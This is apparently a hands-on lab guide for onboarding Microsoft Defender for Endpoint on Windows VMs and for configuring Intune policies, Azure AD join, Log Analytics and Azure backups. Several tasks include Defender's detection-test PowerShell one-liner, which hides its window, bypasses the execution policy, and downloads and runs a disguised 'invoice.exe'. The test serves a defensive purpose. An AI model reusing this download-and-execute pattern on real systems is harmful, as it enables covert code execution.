# Configure Microsoft Defender

- Topics
  - Creating security baselines
  - Hunting
  - Threat Analytics Reports
  
## Exercise 0: Setup

### Task 1: Start a new Defender Trial

- https://www.microsoft.com/en-us/security/business/threat-protection/endpoint-defender?ocid=docs-wdatp-exposedapis-abovefoldlink&rtc=1?ocid=docs-wdatp-exposedapis-abovefoldlink&rtc=1

## Exercise 1: Onboard Microsoft Defender (Script)

### Task 1: Onboard Microsoft Defender Windows 2019 (Script)

Now that you have an `on-premises` environment, you can provision Microsoft Defender to your resources.

1. From the **wssecuritySUFFIX-paw-1** virtual machine, open the [Microsoft Defender Portal](https://security.microsoft.com)
2. Browse to the [Settings -> Endpoints page](https://security.microsoft.com/preferences2/onboarding/preferences2/onboarding)
  
   > **NOTE** If this is the first time loading the security portal it may take a few minutes to setup the security workspace

3. Under **Device Management**, select **Onboarding**
4. In the operating system dropdown, select **Windows Server 1803 and 2019**
5. For the deployment method, select **Local Script (for up to 10 devices)**
6. Select **Download package**, the **WindowsDefenderATPOnboardingPackage.zip** file will download

    ![Click path is highlighted](./media/defender_onboarding_winserver.png "Click path is highlighted")

7. Extract the downloaded zip to `c:\temp`
8. Edit the extracted **WindowsDefenderATPLocalOnboardingScript.bat** file, if prompted, select **Run anyway**

    > **NOTE** The script is specific to the Microsoft Defender instance.  You would not be able to use the same script for other customers!

9. Review the bat file
10. Open a command prompt as an administrator
11. Run the following, when prompted, select **Y**

    ```cmd
    cd c:\temp
    WindowsDefenderATPLocalOnboardingScript.cmd
    ```

12. Press a key to dismiss the cmd prompt
13. Open a new command prompt, run the following

    ```cmd
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
    ```

14. The command prompt should disappear
15. Switch to the Microsoft Defender Portal, under **Incidents and alerts**, select **Alerts**
16. After approximately 5 minutes, you should see an alert generated from the above command displayed.

    ![New alert is displayed](./media/defender_onboarding_winserver_test.png "New alert is displayed")

17. Select it, you should see the following:

    ![The alert details are displayed](./media/defender_onboarding_winserver_alert.png "The alert details are displayed")

### Task 2: Onboard Microsoft Defender Windows 2016 (Script)

Now that you have an `on-premises` environment, you can provision Microsoft Defender to your resources.

1. Browse to the Azure Portal
2. Browse to the **wssecuritySUFFIX-adpdc** virutal machine and connect to it over RDP
3. From the **wssecuritySUFFIX-adpdc** virtual machine, open the [Microsoft Defender Portal](https://security.microsoft.com)
4. Browse to the [Settings -> Endpoints page](https://security.microsoft.com/preferences2/onboarding/preferences2/onboarding)
5. Under **Device Management**, select **Onboarding**
6. In the operating system dropdown, select **Windows Server 2008 R2 SP1, 2012 R2 and 2016**
7. [Download the Microsoft Monitoring Agent (MMA)](https://go.microsoft.com/fwlink/?LinkId=828603)
8. Run the downloaded installer
   1. Select **Next**
   2. Select **I Agree**
   3. Select **Next**
   4. Select the **Connect the agent to Azure Log Analytics (OMS)**

      ![Connect to OMS](./media/mma_connect_oms.png "Connect to OMS")

   5. Select **Next**
   6. From the Microsoft Defender Portal, copy the workspace ID and key into the agent installer dialog
   7. Select **Next**
   8. Select **Next**
   9. Select **Install**
9. Open a command prompt, run the following

    ```cmd
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
    ```

10. Switch to the Microsoft Defender Portal, under **Incidents and alerts**, select **Alerts**
11. You should see an alert generated from the above command displayed.
12. Under **EndPoints**, browse to the **Device Inventory** page (https://security.microsoft.com/machines), you should see your devices displayed.

### Task 3: Windows 10

1. Browse to the Azure Portal
2. Browse to the **wssecuritySUFFIX-win10** virutal machine and connect to it over RDP
3. From the **wssecuritySUFFIX-win10** virtual machine, open the [Microsoft Defender Portal](https://security.microsoft.com)
4. Browse to the [Settings -> Endpoints page](https://security.microsoft.com/preferences2/onboarding/preferences2/onboarding)
5. Under **Device Management**, select **Onboarding**
6. In the operating system dropdown, select **Windows 10**
7. Select **Download package**, the **WindowsDefenderATPOnboardingPackage.zip** file will download
8. Extract the downloaded zip to c:\temp
9. Edit the extracted **WindowsDefenderATPLocalOnboardingScript.bat** file, if prompted, select **Run anyway**

    > **NOTE** The script is specific to the Microsoft Defender instance.  You would not be able to use the same script for other customers!

10. Review the bat file
11. Open a command prompt as an administrator
12. Run the bat file, when prompted, select **Y**
13. Press a key to dismiss the cmd prompt
14. Open Windows Powershell, run the following

    ```PowerShell
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
    ```

15. Switch to the Microsoft Defender Portal, under **Incidents and alerts**, select **Alerts**
16. Again, you should see an alert generated from the above command displayed.

### Task 4: Review Device Settings

1. Switch to the **wssecuritySUFFIX-paw-1** virtual machine
2. Open the **Windows Security** and **Virus and thread protection** page
3. You should see the settings for the device are NOT managed by policy
4. Run the following PowerShell

    ```PowerShell
    Get-MpPreference
    ```

5. You should see the following, notice how the Actions and Ids are empty

    ![No MDE Actions displayed](./media/get-mpreference-noactions.png "No MDE Actions displayed")

### Task 4: Apple iOS (Optional)

1. Open the Apple App Store to the Microsoft Defender Endpoint page (https://apps.apple.com/app/microsoft-defender-atp/id1526737990), you should see the iPhone and iPad app displayed
2. On your iOS devices, open the **App Store**
3. Search for the **Microsoft Defender Endpoint**
4. Select **GET**
5. Enter your email, select **Sign In**

## Exercise 2: Device Groups and Policy

### Task 1: Create Device Group

1. Open the [Microsoft Endpoint Manager Portal](https://endpoint.microsoft.com/#home), login as your lab username and password if prompted
2. Open **Groups > New Group**.
3. For the name, type **MDATP TEST**
4. For the description, type **Group to Pilot MDATP**
5. Select **No members selected** link
6. Select your lab user
7. Select **Create**

### Task 2: Create Policies

1. In the **Endpoint Manager Portal**, select **Endpoint security**
2. Under **Manage**, select **Endpoint detection and response**.
3. Click on **Create Policy**.
4. Under Platform, select **Windows 10 and later**
5. For the Profile select **Endpoint detection and response**.
6. Select **Create**
7. Enter **MDATP EDR Config** for the name and description, then select **Next**.
8. Select **Yes** for all settings, then select **Next**.
9. Select the **Default** scope, then select **Next**.
10. Select **Add Groups**, then select the **MDATP TEST** group you created above, then select **Next**.
11. Review and accept, then select **Create**.

12. Navigate to **Endpoint security > Antivirus > Create Policy**.
13. For Platform, select **Windows 10 and Later**
14. For the Profile, Select **Microsoft Defender Antivirus**
15. Select **Create**.
16. Enter **Pilot Microsoft Defender Antivirus** for the name and description, then select **Next**.
17. On the Configuration settings page, review all the possible configuration settings that can be set via policy, select **Next**
18. Select the **Default** scope, then select **Next**.
19. Select **Add Groups**, then select the **MDATP TEST** group you created above, then select **Next**.
20. Review and accept, then select **Create**.

21. Navigate to **Endpoint security > Attack surface reduction**.
22. Select **Create Policy**.
23. For platform select **Windows 10 and Later**
24. For the profile, select **Attack surface reduction rules**
25. Select **Create**.
26. Enter **MDATP Attack surface reduction rules** for the name and description, then select **Next**.
27. In the Configuration settings page: Set the configurations you require for Attack surface reduction rules, then select **Next**.
28. Add Scope Tags as required, then select **Next**.
29. Select groups to include and assign to test group, then select **Next**.
30. Review the details, then select **Create**.

31. Navigate to **Endpoint security > Attack surface reduction**.
32. Select **Create Policy**.
33. Select **Windows 10 and Later**
34. For profile, select **Web protection (Microsoft Edge Legacy)**
35. Select **Create**.
36. Enter **MDATP Web Protection** for the name and description, then select **Next**.
37. In the Configuration settings page: Set the configurations you require for Web Protection, then select **Next**.
38. Add Scope Tags as required > **Next**.
39. Select Assign to test group > **Next**.
40. Select **Create**.

## Exercise 3: Azure AD Join

### Task 1: Review Endpoint Management

1. Open the Endpoint Manager Portal
2. Select **Devices**, you should NOT see your new win10 device
3. Under **Device enrollment**, select **Enroll devices**
4. Select **Automation Enrollment**
5. For the MDM user scope, select **All**
6. For the MAM user scope, select **None**
7. Select **Save**

    ![Auto enrollment settings](./media/mdm_auto_enrollment.png "Auto enrollment settings")

### Task 2: Enroll Devices (BYOD)

1. From the **wssecuritySUFFIX-win10** virtual machine, from the Windows menu, search for **Access Work or School**
2. Select **Connect**
3. Enter the lab username, select **Next**
4. Enter the lab password, select **Sign In**
5. The device will register with Azure AD, select **Done**
6. You should now see your work account displayed

    ![Azure AD Registration](./media/azure_ad_register.png "Azure AD Registration")

### Task 3: Review Azure AD

1. In the Azure Portal, search for and select **Azure Active Directory**
2. Select **Devices**, you should see the **win10** device registered to your lab account

    ![Azure AD Devices](./media/azure_ad_devices.png "Azure AD Devices")

### Task 4: Review EndPoint Management

1. In the Endpoint Management Portal, select **Devices**, then select **Windows devices**
2. You should see the **win10** device registered to your lab account

    ![Endpoint Devices](./media/endpoint_devices.png "Endpoint Devices")

### Task 5: Review Policy Assignment

1. In the Endpoint Management Portal, select **Endpoint security**
2. Under **Manage**, select **Antivirus**
3. Select the policy you created above, you should see that the policy has been assigned to the **win-10** device for the lab user

### Task 4: Review device policy assignment

1. Switch to the **wssecuritySUFFIX-win10** virtual machine
2. Open the **Windows Security** and **Virus and thread protection** page
3. You should see the settings for the device are now managed by policy

    ![Managed By Policy](./media/mde_managed_by_policy.png "Managed By Policy")

4. Run the following PowerShell

    ```PowerShell
    Get-MpPreference
    ```

5. You should see the following, notice how the Actions and Ids are not empty

    ![MDE Actions displayed](./media/get-mpreference-actions.png "MDE Actions displayed")

6. Open the **Services** applet
7. You should see the **Microsoft Defender Advanced Threat Protection Service** service exists and is **Started**

    ![MDE Windows service is started](./media/mde_windows_service.png "MDE Windows service is started")

## Exercise 4: Microsoft Defender for Cloud / Log Analytics / Sentinel

When connecting devices through the Microsoft Defender for EndPoint Portal, you will see the Log Analytics workspace used is one specifically for the portal and will not show up in the Azure Portal.  If you want to gain access to other integrations, you will need to connect the MMA agent to the Log Analytics workspace in your Azure Portal.

### Task 1: Connect Log Analytics (Manual)

1. From the **wssecuritySUFFIX-win10** virtual machine, open the Azure Portal
2. Browse to the **wssecuritySUFFIX** log analytics workspace
3. Under **Settings**, select **Agents Management**
4. Select **Download Windows Agent (64 bit)**
5. Run the downloaded installer
   1. Select **Next**
   2. Select **I Agree**
   3. Select **Next**
   4. Select the **Connect the agent to Azure Log Analytics (OMS)**
   5. Select **Next**
   6. From the Azure Portal, copy the workspace ID and key into the agent installer dialog
   7. Select **Next**
   8. Select **Next**
   9. Select **Install**
6. Open the `C:\Program Files\Microsoft Monitoring Agent\Agent\AgentControlPanel` program
7. Select the workspaces tab, you should see the Log Analytics Workspace displayed for the windows 10 client machine

    ![Windows 10 OMS Agent configuration](./media/win10_oms_agent.png "Windows 10 OMS Agent configuration")

### Task 2: Connect Log Analytics (Azure automated)

1. Switch to the Azure Portal and the log analytics workspace
2. Under **Workspace Data Sources**, select **Virtual Machines**
3. For each virtual machines displayed, select it

    ![OMS Virtual Machine connect](./media/oms_virtual_machine_connect.png "OMS Virtual Machine connect")

4. Then select **Connect**

    ![Connect a single machine](./media/oms_virtual_machine_connect_single.png "Connect a single machine")

5. This will deploy the agent configuration to each of the virtual machines
6. Switch to the **adpdc** virtual machine
7. Open the agent control panel (`C:\Program Files\Microsoft Monitoring Agent\Agent\AgentControlPanel`), select the **Azure Log Analytics (OMS)** tab, you should see **two** workspaces are connected.  One for Microsoft Defender Endpoint and the other for Azure Log Analytics.

    ![Two OMS workspaces connected](./media/oms_two_workspaces_configured.png "Two OMS workspaces connected")

## Exercise 5: Security baselines with Endpoint Management

Security baselines ensure that security features are configured according to guidance from both security experts and expert Windows system administrators. When deployed, the Defender for Endpoint security baseline sets Defender for Endpoint security controls to provide optimal protection.

### Task 1: Security baselines

1. Open the Endpoint Management portal (https://endpoint.microsoft.com)
2. Select **Endpoint Security**
3. Under **Overview**, select **Security baselines**
4. Select **Windows 10 Security Baseline**
5. Select **Create profile**
6. For the name, type **Lab baseline**
7. Select **Next**
8. On scope tags, select **Next**
9. Review the configuration settings, select **Next**
10. Select **Add groups**, select **MDATP Test**, then select **Next**
11. Select **Create** to save it and deploy it to the assigned device group.

## Exercise 6: Configuring Backups

### Task 1: Create Windows Backup

To prevent a catastrophic loss of data from a ransomware, it is advisable to setup Azure Backup to ensure you have a point in time recovery objective.  You can utilize the built in windows backup services to backup your on-premises machines, but a more cloud-based approach is to use Recovery Services Vaults.  Recovery Services Vaults can be used to backup on-premises and cloud-based resources.

#### Create Recovery Services Vault

1. Open the Azure Portal.
2. Browse to the **wssecurity** resource group
3. In the top bar, search for **Recovery Services vault**
4. Select **Create recovery services vault**
5. Select your resource group
6. For the name, type **wssecuritySUFFIX**
7. Select the same region as your resource group and VM resources
8. Select **Review + create**
9. Select **Create**, once created, select **Go to resource**, you should see a new recovery services vault:

    ![Recovery Services Vault is displayed](./media/recovery_services_vault_created.png "Recovery Services Vault is displayed")

#### Prepare Infrastructure (Recovery Services Agent)

1. Login to the **wssecuritySUFFIX-paw-1** VM
2. Open the Azure Portal using your lab credentials
3. Browse to the new recovery services value, under **Getting started**, select **Backup**
4. Select **Backup**
5. For the workload location, select **On-Premises**
6. For the backup type, select **Files and folders**
7. Select **Prepare Infrastructure**

    ![Prepare file and folder infrastructure](./media/rsv_onpremises_file_backup.png "Prepare file and folder infrastructure")

8. Select **Download Agent for Windows Server or Windows Client**, the MARS agent will begin downloading. When complete, start the installer
9. Select **Next**
10. Select **Next**
11. Select **Install**
12. Select **Proceed to Registration**

    ![Registration dialog](./media/rsv_registration.png "Registration dialog")

13. Switch back the Azure portal, select **Already downloaded or using the latest Recovery Services Agent**
14. Select **Download**
15. Switch back to the installer, select **Browse**, browse to the vault credentials file, select it, then select **Open**
16. Select **Next**
17. Select **Generate Passphrase**
18. Click **Browse** to select a save location
19. Select **Finish**, select **Yes** in the dialog
20. Select **Close**
21. Switch back to the Azure Portal
22. Browse to the Azure Key Vault, select **Secrets**
23. Select **Generate/Import**

    ![Azure Key Vault Secrets page](./media/key_vault_add_secret.png "Azure Key Vault Secrets page")

24. For the name, type **paw-backup-passphrase**
25. Open the text file on the desktop, copy the passphrase and paste it into the **Value** textbox
26. Select **Create**
27. Delete the passphrase file on the desktop
28. Clear the recycle bin
29. In the Microsoft Azure Backup window, select **Schedule Backup**
30. Select **Next**
31. Select **Add Items**
32. Select the **System state** and the **C:** drive
33. Select **OK**
34. Select **Next**
35. To adjust your recovery point objective, you could move the backup schedule from a weekly execution to a daily one, however, simply select **Next**
36. For the retention policy, leave at 8 weeks, select **Next**
37. Select **Next**
38. Select **Next**
39. Notice the options for the backup type, select **Next**
40. Select **Finish**

<!--
#### Prepare Infrastructure (Azure Backup Server)

1. Login to the **wssecuritySUFFIX-paw-1** VM
2. Open the Azure Portal using your lab credentials
3. Browse the new recovery services value, under **Getting started**, select **Backup**
4. For the workload location, select **On-Premises**
5. For the backup type, select **Bare Metal Recovery**
6. Select **Prepare Infrastructure**
7. Select **Download** to download the Azure Backup Server software.
8. On the download page, select **Download**.  Select all the files to download, in the browser popup, select **Accept**

   > **Note** These files are ~5GB

9. Open the downloaded installer exe file
10. Select **Next**
11. Select **I accept...** checkbox, select **Next**
12. On the extract dialog, select **Next**
13. Select **Extract**, if prompted select where you download the .bin files. The files will be extracted to the target location, when completed select **Finish**

#### Install Azure Backup Server

1. Open the extracted **C:\System_Center_Microsoft_Azure_Backup_Server_v3\System Center Microsoft Azure Backup Server v3** folder
2. Run the **setup.msi** installer
3. Select **Microsoft Azure Backup Server**
4. Select **Next**
5. Select **Check**
6. Select **Next**
7. Select **Check and Install**

    > **Note** If you get an error about Active Directory, run the joinDomain.ps1 PowerShell script

9. TBD - NEED AD

#### Install DPM Agent

1. Open the extracted **C:\System_Center_Microsoft_Azure_Backup_Server_v3\System Center Microsoft Azure Backup Server v3** folder
2. Select **DPM Protection Agent**, once installed, press **Enter** to close the install window.

#### Configure Azure Backup Server

1. Switch back the Azure Portal
2. Check the **Already downloaded or using the latest...** checkbox
3. Select **Download** to download the vault credentials
4. TBD

-->

#### Perform a Backup

1. Open Azure Portal
2. Browse to **wssecuritySUFFIX-paw-1** virtual machine
3. Under **Operations**, select **Backup**
4. Select **Enable backup**
5. Browse to the recovery services vault
6. Under **Protected items**, select **Backup items**
7. Select **Azure Virtual Machine**
8. Select the **wssecuritySUFFIX-paw-1** virtual machine
9. Select **Backup now**

## Exercise 4: OneDrive for Business

Setup the OneDrive client.

### Task 1: Install OneDrive for Business

1. Switch to the **wssecurity-win10** virtual machine
2. Search for **OneDrive**, then select it
3. Enter your lab username, notice you do not have to enter your password, you are domain joined!

   > **Note** On other machines, you would need to enter your lab username and password.

4. Select **Next**
5. Select **Continue**
6. Click through the remaining dialogs

## Exercise 5: File Share Backup

Setup File Share backups

### Task 1: Setup File Share Backup

1. Open the Azure Portal.
2. Navigate to the **wssecuritySUFFIX** storage account
3. Select **File shares**
4. Select the **users** file share
5. Under **Operations**, select **Backup**
6. Select **Enable Backup**
7. Under **Operations**, select **Snapshots**
8. Select **Add snaphost**
9. For the name, type **Day01**
10. Select **OK**
11. Browse to the Recovery Services Vault
12. Under **Protected Items**, select **Backup items**
13. Select the **Azure Storage (Azure Files)** node
14. Select the **users** file share
15. Select **Backup now**
16. Select **OK**

## Resources

- [Recovery Services Vault](https://docs.microsoft.com/en-us/azure/backup/backup-azure-recovery-services-vault-overview)
- [Data Protection Manager](https://docs.microsoft.com/en-us/system-center/dpm/dpm-overview?view=sc-dpm-2019)
- [Azure Backup](https://docs.microsoft.com/en-us/azure/backup/backup-overview)
- [MARS Agent](https://docs.microsoft.com/en-us/azure/backup/backup-azure-manage-mars)
- [Security baselines](https://docs.microsoft.com/en-us/mem/intune/protect/security-baselines)
- [EDR in block mode](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/edr-in-block-mode?view=o365-worldwide)
